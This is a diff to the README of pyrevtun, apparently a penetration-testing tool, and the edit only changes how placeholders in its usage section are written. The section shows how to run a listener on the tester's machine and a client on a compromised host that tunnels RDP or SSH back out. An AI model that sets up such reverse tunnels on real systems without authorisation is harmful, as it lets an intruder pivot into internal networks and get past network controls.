@@ -20,16 +20,16 @@ Tool Usage
 ==========
 1) On the penetration tester's local machine, setup pyrevtun in listener mode:
 
-- python pyrevtun.py -m listener -l <listener IP:port> -t <local tunnel port> -s <certificate file> -k <private key file> -p <auth password>
+- python pyrevtun.py -m listener -l [IP:port] -t [local tunnel port] -s [certificate file] -k [private key file] -p [auth password]
 - e.g. python pyrevtun.py -m listener -l 192.168.1.59:443 -t 33389 -s example_cert.pem -k example_key.pem -p pass
 
 2) On compromised machine, setup pyrevtun in client mode:
 
-- pyrevtun.py -m client -l <listener IP:port> -c <target IP:port> -p <password>
+- pyrevtun.py -m client -l [listener IP:port] -c [target IP:port] -p [auth password]
 - e.g. python pyrevtun.py -m client -l 192.168.102.59:443 -c 10.5.5.5:3389 -p pass
 - This connection will open up the chosen local port on the pen test machine.
 
-3) Using TCP app (i.e. RDP, SSH client), connect to specified local port as localhost:<local tunnel port> 
+3) Using TCP app (i.e. RDP, SSH client), connect to specified local port as [localhost:local tunnel port] 
 - e.g. localhost:33389
 
 *To prevent lockup, run in the background (&)
